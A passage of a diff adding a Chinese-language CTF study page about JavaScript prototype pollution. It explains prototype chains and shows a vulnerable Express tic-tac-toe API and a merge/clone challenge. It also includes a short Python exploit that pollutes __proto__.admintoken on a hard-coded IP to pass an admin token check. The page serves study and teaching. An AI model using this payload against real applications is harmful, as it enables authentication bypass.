+        <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="p">){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;X&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">winner</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;O&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">winner</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nx">i</span><span class="p">]){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;X&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">winner</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;O&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">winner</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;X&#39;</span><span class="p">){</span>
+        <span class="nx">winner</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;O&#39;</span><span class="p">){</span>
+        <span class="nx">winner</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;X&#39;</span><span class="p">){</span>
+        <span class="nx">winner</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;O&#39;</span><span class="p">){</span>
+        <span class="nx">winner</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">draw</span><span class="p">(</span><span class="nx">matrix</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">winner</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">winner</span><span class="o">:</span> <span class="mi">0</span><span class="p">}))</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">winner</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">winner</span><span class="o">:</span> <span class="nx">winner</span><span class="p">}))</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">winner</span><span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">}))</span>
+    <span class="p">}</span>
+
+<span class="p">})</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;app listening on port 3000!&#39;</span><span class="p">)</span>
+<span class="p">})</span>
+</pre></div>
+
+<p>漏洞关键位置</p>
+<div class="codehilite"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/api&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">winner</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">client</span><span class="p">.</span><span class="nx">row</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="o">||</span> <span class="nx">client</span><span class="p">.</span><span class="nx">col</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">){</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">row</span> <span class="o">%=</span> <span class="mi">3</span><span class="p">;</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">col</span> <span class="o">%=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">matrix</span><span class="p">[</span><span class="nx">client</span><span class="p">.</span><span class="nx">row</span><span class="p">][</span><span class="nx">client</span><span class="p">.</span><span class="nx">col</span><span class="p">]</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+</pre></div>
+
+<p>而data是从网页传递的参数,形如:</p>
+<p><code>{"row":1,"col":"1","data":"X"}</code></p>
+<p>对应的row以及col值会存放至matrix中,而这里则会导致一个原型链污染的隐患。</p>
+<p>回到题目本身的逻辑中,获得Flag的要求为:</p>
+<blockquote>
+<p>传入的querytoken与user.admintoken的md5哈希值一样</p>
+</blockquote>
+<p>一个简要的原型链污染如下：</p>
+<div class="codehilite"><pre><span></span>&gt;  a=[];
+&lt;· []
+&gt;  b=[];
+&lt;· []
+&gt;  b[&quot;__proto__&quot;];
+&lt;· [constructor: ƒ, concat: ƒ, find: ƒ, findIndex: ƒ, pop: ƒ, …]
+&gt;  b[&quot;__proto__&quot;][&quot;admintoken&quot;]=&quot;ccda&quot;;
+&lt;· &quot;ccda&quot;
+&gt;  a
+&lt;· []
+&gt;  a.admintoken
+&lt;· &quot;ccda&quot;
+</pre></div>
+
+<p>参考wp得到一个exp如下：</p>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://185.168.131.1:3000/api&#39;</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;row&#39;</span><span class="p">:</span><span class="s1">&#39;__proto__&#39;</span><span class="p">,</span><span class="s1">&#39;col&#39;</span><span class="p">:</span><span class="s1">&#39;admintoken&#39;</span><span class="p">,</span><span class="s1">&#39;data&#39;</span><span class="p">:</span><span class="s1">&#39;qqq&#39;</span><span class="p">})</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://185.168.131.1:3000/admin?querytoken=&#39;</span> <span class="o">+</span> <span class="n">md5sumhex</span><span class="p">(</span><span class="s1">&#39;qqq&#39;</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+
+<p>那么<code>matrix[__proto__][admintoken]=qqq</code>
+这就足以达到目的了</p>
+<p>GitHub上一个用来检测是否存在原型链污染的项目 <a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md">https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md</a></p>
+<h1 id="p">p牛<a class="headerlink" href="#p" title="Permanent link">&para;</a></h1>
+<p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
+<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">Foo</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">bar</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="p">}</span>
+
+<span class="k">new</span> <span class="nx">Foo</span><span class="p">()</span>
+</pre></div>
+
+<p>Foo函数的内容，就是Foo类的构造函数，而this.bar就是Foo类的一个属性。</p>
+<h1 id="_3">安全客<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<p><img alt="img" src="../assets/t019556fd16ba65eeb5.png" /></p>
+<p><code>b</code>在实例化为<code>test对象</code>以后，就可以输出test类中的<code>属性a</code>了</p>
+<p>在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止</p>
+<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">i</span><span class="p">(){</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="s2">&quot;test1&quot;</span><span class="p">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="s2">&quot;test2&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p><img alt="img" src="../assets/t01cd3f549f7931af2b.png" /></p>
+<p><code>i</code>的父类为object，且里面还有许多函数，这就解释了为什么许多变量可以调用某些方法。</p>
+<p>在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是<code>__proto__</code>和类的<code>prototype</code>对应。且二者是等价的</p>
+<p><img alt="img" src="../assets/t015c638a722c8647e9.png" /></p>
+<h2 id="_4">创建一个类时<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../assets/t01b128815e74731722.png" /></p>
+<p>原型链为<code>b -&gt; a.prototype -&gt; object.prototype-&gt;null</code></p>
+<h2 id="_5">创建一个数组时<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../assets/t01fa7b79ff6a41fc0f.png" /></p>
+<p><code>c -&gt; array.prototype -&gt; object.prototype-&gt;null</code></p>
+<h2 id="_6">创建一个函数时<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../assets/t01b78066761d72b215.png" /></p>
+<p>原型链为：<code>d -&gt; function.prototype -&gt; object.prototype-&gt;null</code></p>
+<h2 id="_7">创建一个日期<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../assets/t0160fae0d096488fc5.png" /></p>
+<p><code>f -&gt; Data.prototype -&gt; object.prototype-&gt;null</code></p>
+<p>得出：</p>
+<blockquote>
+<p>javascript 一切皆对象，一切皆始于 <code>object.prototype</code></p>
+</blockquote>
+<h2 id="_8">搜索的过程<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../assets/t01e25362c66a17681a.png" /></p>
+<blockquote>
+<p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined</p>
+</blockquote>
+<p><code>j -&gt; i.prototype -&gt; object.prototype -&gt; null</code></p>
+<h2 id="_9">举例<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<p><code>mess.js</code>文件</p>
+<div class="codehilite"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">secret</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;aaa&quot;</span><span class="p">,</span><span class="s2">&quot;bbb&quot;</span><span class="p">];</span>
+    <span class="nx">secret</span><span class="p">.</span><span class="nx">forEach</span><span class="p">();</span>
+<span class="p">})();</span>
+</pre></div>
+
+<p><code>attach.html</code></p>
+<p><img alt="img" src="../assets/t0156fe7a23c815fcae.png" /></p>
+<p>结果如下：</p>
+<p><img alt="img" src="../assets/t014e1e98074c233ab0.png" /></p>
+<p>mess.js中我们声明了一个数组 <code>secret</code>,然后该数组调用了属于 <code>Array.protottype</code>的<code>foreach</code>方法,如下</p>
+<p><img alt="img" src="../assets/t01147f05bd2ee7576a.png" /></p>
+<p>在调用js文件之前，js代码中将<code>Array.prototype.foreach</code>方法进行了重写，而prototype链为<code>secret -&gt; Array.prototype -&gt;object.prototype</code>,secret中无 foreach 方法，所以就会向上检索，就找到了<code>Array.prototype</code> 而其<code>foreach</code>方法已经被重写过了，所以会执行输出。</p>
+<p>这就是原型链污染。很明显，原型链污染就是：<code>在我们想要利用的代码之前的赋值语句如果可控的话，我们进行 ——__proto__ 赋值，之后就可以利用代码了</code></p>
+<p>看一道题：</p>
+<div class="codehilite"><pre><span></span><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+
+<span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cookie-parser&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+
+
+<span class="kr">const</span> <span class="nx">isObject</span> <span class="o">=</span> <span class="nx">obj</span> <span class="p">=&gt;</span> <span class="nx">obj</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">===</span> <span class="nb">Object</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">attr</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isObject</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="nx">merge</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">],</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">a</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">merge</span><span class="p">({},</span> <span class="nx">a</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Constants</span>
+<span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">HOST</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">admin</span> <span class="o">=</span> <span class="p">{};</span>
+
+<span class="c1">// App</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;views&#39;</span><span class="p">)));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/signup&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">));</span>
+    <span class="kd">var</span> <span class="nx">copybody</span> <span class="o">=</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">copybody</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="nx">copybody</span><span class="p">.</span><span class="nx">name</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span>
+            <span class="s2">&quot;done&quot;</span><span class="o">:</span> <span class="s2">&quot;cookie set&quot;</span>
+        <span class="p">});</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+            <span class="s2">&quot;error&quot;</span><span class="o">:</span> <span class="s2">&quot;cookie not set&quot;</span>
+        <span class="p">})</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/getFlag&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">аdmin</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">))</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">admin</span><span class="p">.</span><span class="nx">аdmin</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;hackim19{}&quot;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;You are not authorized&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="nx">HOST</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Running on http://</span><span class="si">${</span><span class="nx">HOST</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</pre></div>
+
+<p>本地测试：</p>
+<p><img alt="img" src="../assets/t01ca40069c07f3bc16.png" /></p>
+<p>未成功</p>
+<p><img alt="img" src="../assets/t015a99e81f7d6ed181.png" /></p>
+<p>们在创建字典的时候，<code>__proto__</code>,不是作为一个键名，而是已经作为<code>__proto__</code>给其父类进行赋值了，所以在<code>test.__proto__</code>中才有admin属性，但是我们是想让<code>__proto__</code>作为一个键值的.</p>
+<p>使用JSON.parse</p>
+<p><img alt="img" src="../assets/t0143621daff1e3c7b0.png" /></p>
+<p>JSON.parse 会把一个json字符串 转化为 javascript的object</p>
+<p><img alt="payload" src="../assets/t0170b8adbc3097c720.png" /></p>
+<h1 id="_10">参考<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h1>
+<p><a href="https://xz.aliyun.com/t/2735">https://xz.aliyun.com/t/2735</a></p>
+<p><a href="https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming">https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming</a></p>
+<p><a href="https://www.anquanke.com/post/id/176884">https://www.anquanke.com/post/id/176884</a></p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../java/" title="从反序列化到命令执行 - Java 中的 POP 执行链" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                从反序列化到命令执行 - Java 中的 POP 执行链
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../nodejs/" title="Nodejs" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Nodejs
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.245445c6.js"></script>
+      
+        
+        
+          
+          <script src="../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
